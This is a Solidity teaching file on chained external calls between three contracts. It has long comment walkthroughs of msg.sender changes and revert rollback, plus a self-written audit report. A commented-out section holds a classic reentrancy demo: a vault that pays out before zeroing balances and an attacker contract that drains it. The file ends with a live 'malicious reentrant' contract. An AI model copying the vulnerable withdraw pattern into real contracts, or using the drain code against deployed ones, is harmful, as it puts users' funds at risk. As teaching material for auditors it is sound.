// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
=========================================================
PRACTICAL: Chain multiple external calls
CONCEPT: Complex execution
=========================================================

OBJECTIVE

- Learn chained external execution flow
- Understand multi-contract interactions
- Learn failure propagation behavior
- Think like protocol auditor

---------------------------------------------------------
CORE IDEA
---------------------------------------------------------

One contract may call:
another contract,
which calls another contract.

---------------------------------------------------------

Execution chains become:

Contract A
    ->
Contract B
    ->
Contract C

---------------------------------------------------------
IMPORTANT UNDERSTANDING
---------------------------------------------------------

Every external call:

- changes execution context
- changes msg.sender
- creates attack surface
- may revert entire chain

---------------------------------------------------------
WHY THIS MATTERS
---------------------------------------------------------

Modern DeFi heavily relies on:

multi-contract execution chains.

---------------------------------------------------------
REAL-WORLD USAGE
---------------------------------------------------------

Chained calls appear in:

- swaps
- lending
- flash loans
- routers
- bridges
- multicall systems

---------------------------------------------------------
AUDITOR FOCUS
---------------------------------------------------------

Auditors inspect:

- nested external calls
- failure propagation
- trust assumptions
- reentrancy windows
- state consistency

=========================================================
CONTRACT C
FINAL TARGET
=========================================================
*/
/*
contract ContractCVul {

    /*
        TRACK EXECUTION
    
    uint256 public counter;

    /*
    =====================================================
    FINAL EXECUTION
    =====================================================
    

    function finalStep() external {
        /*
            Increment execution counter.
        
        counter++;
    }

    /*
    =====================================================
    FAILING FUNCTION
    =====================================================
    

    function failStep() external  pure {
        revert("Contract C failure");
    }
}

/*
=========================================================
CONTRACT B
MIDDLE CONTRACT
=========================================================


contract ContractBVul {
    /*
        STORE CONTRACT C
    
    ContractCVul public contractC;

    /*
        TRACK EXECUTION
    
    uint256 public middleCounter;

    /*
        CONSTRUCTOR
    
    constructor(address _contractC){
        contractC = ContractCVul(_contractC);
    }

    /*
    =====================================================
    CALL CONTRACT C
    =====================================================
    

    function callFinalStep() external{
        /*
            Local state update.
        
        middleCounter++;

        /*
            EXTERNAL CALL:
            Contract B -> Contract C
        
        contractC.finalStep();
    }

    /*
    =====================================================
    CALL FAILING FUNCTION
    =====================================================
    

    function callFailingStep()  external {
        /*
            State update.
        
        middleCounter++;

        /*
            External call that reverts.
        
        contractC.failStep();
    }
}

/*
=========================================================
CONTRACT A
ENTRY CONTRACT
=========================================================

contract ContractAVul {
    /*
        STORE CONTRACT B
    
    ContractBVul public contractB;

    /*
        TRACK EXECUTION
    
    uint256 public entryCounter;

    /*
        CONSTRUCTOR
    
    constructor(address _contractB) {
        contractB = ContractBVul(_contractB);
    }

    /*
    =====================================================
    START EXECUTION CHAIN
    =====================================================
    

    function startChain() external{
        /*
            Local state update.
        
        entryCounter++;
        /*
            EXTERNAL CALL:
            Contract A -> Contract B
        
        contractB.callFinalStep();
    }

    /*
    =====================================================
    START FAILING CHAIN
    =====================================================
    

    function startFailingChain() external{
        /*
            State update.
        
        entryCounter++;
        /*
            Nested call chain eventually fails.
        
        contractB.callFailingStep();
    }
}
*/
/*
=========================================================
EXECUTION FLOW
=========================================================

DEPLOY ORDER:

1. Deploy ContractC
2. Deploy ContractB
3. Deploy ContractA

---------------------------------------------------------

Constructor wiring:

ContractB -> ContractC
ContractA -> ContractB

=========================================================
TRACE:
startChain()
=========================================================

STEP 1:
User calls:

ContractA.startChain()

=========================================================
STEP 2
=========================================================

ContractA updates storage.

---------------------------------------------------------

entryCounter++

---------------------------------------------------------

NEW VALUE:
1

=========================================================
STEP 3
=========================================================

External call:

ContractA
    ->
ContractB.callFinalStep()

=========================================================
STEP 4
=========================================================

Execution enters:
ContractB

---------------------------------------------------------

middleCounter++

---------------------------------------------------------

NEW VALUE:
1

=========================================================
STEP 5
=========================================================

Another external call:

ContractB
    ->
ContractC.finalStep()

=========================================================
STEP 6
=========================================================

Execution enters:
ContractC

---------------------------------------------------------

counter++

---------------------------------------------------------

NEW VALUE:
1

=========================================================
FINAL RESULT
=========================================================

All contracts updated successfully.

---------------------------------------------------------

ContractA.entryCounter = 1

ContractB.middleCounter = 1

ContractC.counter = 1

=========================================================
IMPORTANT EXECUTION UNDERSTANDING
=========================================================

Execution CONTEXT switches
during every external call.

=========================================================
msg.sender FLOW
=========================================================

---------------------------------------------------------
Inside ContractA
---------------------------------------------------------

msg.sender = User

---------------------------------------------------------
Inside ContractB
---------------------------------------------------------

msg.sender = ContractA

---------------------------------------------------------
Inside ContractC
---------------------------------------------------------

msg.sender = ContractB

=========================================================
VERY IMPORTANT
=========================================================

msg.sender changes at EACH hop.

=========================================================
FAILING CHAIN TRACE
=========================================================

CALL:
startFailingChain()

=========================================================

STEP 1:
ContractA updates:

entryCounter++

=========================================================
STEP 2
=========================================================

ContractA calls:
ContractB

=========================================================
STEP 3
=========================================================

ContractB updates:

middleCounter++

=========================================================
STEP 4
=========================================================

ContractB calls:
ContractC.failStep()

=========================================================
STEP 5
=========================================================

ContractC reverts:

"Contract C failure"

=========================================================
IMPORTANT
=========================================================

Revert propagates upward.

---------------------------------------------------------

ContractC
    ->
ContractB
    ->
ContractA

=========================================================
FINAL RESULT
=========================================================

ENTIRE transaction reverts.

---------------------------------------------------------

ALL previous state updates rollback.

=========================================================
ROLLBACK OBSERVATION
=========================================================

Even though:

entryCounter++

and

middleCounter++

already executed,

---------------------------------------------------------

ALL changes revert atomically.

=========================================================
REMIX TESTING
=========================================================

STEP 1:
Deploy ContractC

---------------------------------------------------------

STEP 2:
Deploy ContractB

Input:
ContractC address

---------------------------------------------------------

STEP 3:
Deploy ContractA

Input:
ContractB address

---------------------------------------------------------

STEP 4:
Call:
startChain()

---------------------------------------------------------

STEP 5:
Check all counters

EXPECTED:
all incremented

=========================================================
STEP 6
=========================================================

Call:
startFailingChain()

---------------------------------------------------------

EXPECTED:
full transaction revert

=========================================================
STEP 7
=========================================================

Check counters again.

---------------------------------------------------------

IMPORTANT:
No new increments occurred.

=========================================================
IMPORTANT SECURITY CONCEPT
=========================================================

Nested external calls create:

---------------------------------------------------------
COMPLEX EXECUTION FLOW
---------------------------------------------------------

and

---------------------------------------------------------
LARGER ATTACK SURFACE
---------------------------------------------------------

=========================================================
COMMON AUDIT RISKS
=========================================================

---------------------------------------------------------
1. REENTRANCY
---------------------------------------------------------

Nested calls may reenter earlier contracts.

---------------------------------------------------------
2. FAILURE PROPAGATION
---------------------------------------------------------

One revert breaks entire chain.

---------------------------------------------------------
3. msg.sender CONFUSION
---------------------------------------------------------

Authentication assumptions fail.

---------------------------------------------------------
4. TRUST ASSUMPTIONS
---------------------------------------------------------

External contracts may behave maliciously.

=========================================================
IMPORTANT ATTACK THINKING
=========================================================

Attackers abuse:

- nested execution
- callback chains
- external state assumptions
- recursive interactions

---------------------------------------------------------

Complexity increases risk heavily.

=========================================================
SECURITY / AUDITOR MINDSET
=========================================================

Auditors trace:

- every external jump
- every state mutation
- every revert path
- msg.sender transitions
- reentrancy windows

=========================================================
REAL AUDITOR PROCESS
=========================================================

Auditors build:

---------------------------------------------------------
FULL EXECUTION GRAPH
---------------------------------------------------------

to understand:

- control flow
- state dependencies
- attack surface

=========================================================
WHY COMPLEXITY IS DANGEROUS
=========================================================

More external calls =
more assumptions.

---------------------------------------------------------

More assumptions =
more vulnerabilities.

=========================================================
MINI CHALLENGE
=========================================================

Modify contracts so that:

1. Add ETH transfers
2. Add low-level call()
3. Add try/catch handling
4. Add malicious reentrant contract

BONUS:
Create mini DeFi router chain.

=========================================================
IMPORTANT CONCEPTS LEARNED
=========================================================

- Contracts can chain external calls
- msg.sender changes across contracts
- Nested execution increases complexity
- Reverts propagate upward
- Transactions rollback atomically
- External calls create attack surface
- Multi-contract systems are harder to audit
- Auditors trace full execution chains
- Complex execution increases security risk
- Inter-contract trust assumptions matter heavily

=========================================================
*/

/*
/*
=========================================================
AUDIT REPORT
=========================================================

Title: Nested External Call Execution Chain

Severity: Informational

Reason:
The contracts perform chained external calls across
multiple contracts. No exploitable vulnerability was
identified in the current implementation.

Location:

Contract: ContractAVul
Function: startChain(), startFailingChain()

Contract: ContractBVul
Function: callFinalStep(), callFailingStep()

Contract: ContractCVul
Function: finalStep(), failStep()

Vulnerability Description:

The contracts demonstrate a multi-contract execution flow:

ContractA
    ->
ContractB
    ->
ContractC

External calls are performed correctly and Solidity's
default revert propagation behavior is preserved.

When ContractC reverts, the revert propagates through
ContractB and ContractA, causing the entire transaction
to revert atomically.

No unsafe state exposure or exploitable logic was found.

Impact:

No direct security impact identified.

The contracts correctly demonstrate:

- Nested external calls
- msg.sender transitions
- Revert propagation
- Atomic transaction rollback

Proof of Concept:

        1. Deploy ContractCVul.

        2. Deploy ContractBVul with
        ContractCVul address.

        3. Deploy ContractAVul with
        ContractBVul address.

        4. Call:
        startChain()

        Result:
        ContractAVul.entryCounter = 1
        ContractBVul.middleCounter = 1
        ContractCVul.counter = 1
        Execution succeeds.

        5. Call:
        startFailingChain()

        Result:
        ContractCVul.failStep() reverts.

Revert propagates:

ContractCVul
    ->
ContractBVul
    ->
ContractAVul

Entire transaction reverts.
Counters remain unchanged.

Root Cause:
No vulnerability identified.
The contracts intentionally demonstrate
nested execution and revert propagation.

Recommendation:
No immediate security fix required.
For production systems auditors should additionally review:

- Reentrancy risks
- Access control
- Trust assumptions
- Failure handling
- External-call complexity

Example:

ContractA
    ->
ContractB
        ->
        ContractC

Every external call should be audited
for unexpected behavior.
*/
// patched code 
/*
contract ContractC {

    /*
        TRACK EXECUTION
    
    uint256 public counter;

    /*
    =====================================================
    FINAL EXECUTION
    =====================================================
    

    function finalStep()
        external
    {

        /*
            Increment execution counter.

        counter++;
    }

    /*
    =====================================================
    FAILING FUNCTION
    =====================================================
    

    function failStep()
        external
        pure
    {

        revert("Contract C failure");
    }

    event ETHReceived(address sender,uint amount);

    receive() external payable {
        emit ETHReceived(msg.sender,msg.value);
     }
}

interface IC {
    function failStep() external ;
}
/*
=========================================================
CONTRACT B
MIDDLE CONTRACT
=========================================================

contract ContractB {

    /*
        STORE CONTRACT C
    
    ContractC public contractC;

    /*
        TRACK EXECUTION
    
    uint256 public middleCounter;

    /*
        CONSTRUCTOR
    
    constructor(address _contractC)
    {

        contractC = ContractC(payable (_contractC));
    }

    /*
    =====================================================
    CALL CONTRACT C
    =====================================================
    

    function callFinalStep()
        external
    {

        /*
            Local state update.
        
        middleCounter++;

        /*
            EXTERNAL CALL:
            Contract B -> Contract C
        
        contractC.finalStep();
    }

    /*
    =====================================================
    CALL FAILING FUNCTION
    =====================================================
    

    function callFailingStep() external{
        /*
            State update.
        
        middleCounter++;
        /*
            External call that reverts.
        
        // High-level:
        contractC.failStep();
    }

    //low-kevel call
    function lowLevelCallToC() external {
        (bool success,)=address(contractC).call(abi.encodeWithSignature("finalStep()"));
        require(success,"call failed");
    }

    function sendETHTo()external payable {
        payable (address(contractC)).transfer(msg.value);
    }

    string public lastError;
    function tryCatchEx() external {
        try IC(address(contractC)).failStep(){

        }catch Error(string memory reason){
            lastError=reason;
        }catch{
            lastError="unkown Error";
        }
    }
}

/*
=========================================================
CONTRACT A
ENTRY CONTRACT
=========================================================


contract ContractA {

    /*
        STORE CONTRACT B
    
    ContractB public contractB;

    /*
        TRACK EXECUTION
    
    uint256 public entryCounter;

    /*
        CONSTRUCTOR
    
    constructor(address _contractB){
        contractB = ContractB(_contractB);
    }

    /*
    =====================================================
    START EXECUTION CHAIN
    =====================================================
    

    function startChain() external {
        /*
            Local state update.
        
        entryCounter++;

        /*
            EXTERNAL CALL:
            Contract A -> Contract B
        
        contractB.callFinalStep();
    }

    /*
    =====================================================
    START FAILING CHAIN
    =====================================================
    

    function startFailingChain()
        external
    {

        /*
            State update.
        
        entryCounter++;

        /*
            Nested call chain eventually fails.
        
        contractB.callFailingStep();
    }

    function startETHChain() external payable {
        contractB.sendETHTo{value:msg.value}();
    }
}
// attack
contract Vulnerable {

    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

event WithdrawStarted(address user, uint256 amount);
event WithdrawFinished(address user);

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        
     emit WithdrawStarted(msg.sender, amount);

       (bool success,)= payable(msg.sender).call{value: amount}("");
       require(success, "Transfer failed");

 emit WithdrawFinished(msg.sender);
        balances[msg.sender] = 0;
    }

    receive() external payable {}
}

contract Malicious {
    Vulnerable public target;
    event Reentered(uint256 targetBalance);


    constructor(address _target) {
        target = Vulnerable(payable(_target));
    }

    function attack() external payable  {
         target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
         emit Reentered(address(target).balance);

        if(address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }
}
*/
/*
=========================================================
CONTRACT C
=========================================================
*/

contract ContractCVul {

    uint public counter;

    /*
        FINAL EXECUTION
    */
    function finalStep() external payable {
        counter++;
    }

    /*
        FAILING FUNCTION
    */
    function failStep() external pure {
        revert("Contract C failure");
    }

    /*
        ETH TRANSFER
    */
    function sendETH(address payable to)
        external
        payable
    {
        (bool success, ) =
            to.call{value: msg.value}("");

        require(success, "ETH transfer failed");
    }

    receive() external payable {}
}


/*
=========================================================
CONTRACT B
=========================================================
*/

contract ContractBVul {

    ContractCVul public contractC;
    uint public middleCounter;

    constructor(address payable _contractC) {
        contractC = ContractCVul(_contractC);
    }

    /*
        NORMAL CALL + ETH
    */
    function callFinalStep() external payable {

        middleCounter++;

        contractC.finalStep{value: msg.value}();
    }

    /*
        LOW-LEVEL call()
    */
    function lowLevelCall() external {

        (bool success, ) =
            address(contractC).call(
                abi.encodeWithSignature(
                    "finalStep()"
                )
            );

        require(success, "Call failed");
    }

    /*
        TRY / CATCH
    */
    function callFailingStep() external {

        middleCounter++;

        try contractC.failStep() {

        }
        catch Error(string memory reason) {

        }
        catch {

        }
    }

    receive() external payable {}
}


/*
=========================================================
CONTRACT A
=========================================================
*/

contract ContractAVul {

    ContractBVul public contractB;
    uint public entryCounter;

    constructor(address _contractB) {
        contractB = ContractBVul(_contractB);
    }

    /*
        A -> B -> C + ETH
    */
    function startChain() external payable {

        entryCounter++;

        contractB.callFinalStep{value: msg.value}();
    }

    /*
        LOW-LEVEL call()
    */
    function lowLevelCall() external {

        (bool success, ) =
            address(contractB).call(
                abi.encodeWithSignature(
                    "callFinalStep()"
                )
            );

        require(success, "B call failed");
    }

    receive() external payable {}
}


/*
=========================================================
MALICIOUS REENTRANT CONTRACT
=========================================================
*/

contract MaliciousReentrant {

    ContractCVul public target;
    bool public attacking;

    constructor(address _target) {
        target = ContractCVul(_target);
    }

    /*
        START ATTACK
    */
    function attack() external payable {

        attacking = true;

        target.sendETH{value: msg.value}(
            payable(address(this))
        );
    }

    /*
        RE-ENTER WHEN ETH IS RECEIVED
    */
    receive() external payable {

        if (attacking) {

            target.sendETH{value: 0}(
                payable(address(this))
            );
        }
    }

    function stopAttack() external {
        attacking = false;
    }
}